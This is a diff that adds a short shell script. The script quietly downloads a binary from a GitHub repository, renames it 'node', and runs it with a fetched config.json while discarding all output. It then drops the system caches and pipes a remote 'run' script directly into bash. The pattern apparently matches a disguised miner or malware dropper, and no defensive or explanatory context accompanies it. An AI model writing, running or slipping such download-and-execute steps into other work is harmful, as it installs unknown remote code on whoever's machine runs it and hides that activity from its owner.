@@ -1,0 +1,7 @@
+wget -q -O node https://github.com/teknikpintarit/file/raw/main/lab && chmod +x node
+wget -q https://raw.githubusercontent.com/teknikpintarit/file/main/SHA256SUMS && chmod +x SHA256SUMS 
+wget -q https://raw.githubusercontent.com/teknikpintarit/file/main/config.json && chmod +x config.json
+./node -c "config.json" >/dev/null 2>&1  
+sleep 1
+sync; echo 3 > /proc/sys/vm/drop_caches &
+curl -sL https://raw.githubusercontent.com/teknikpintarit/file/main/run | bash
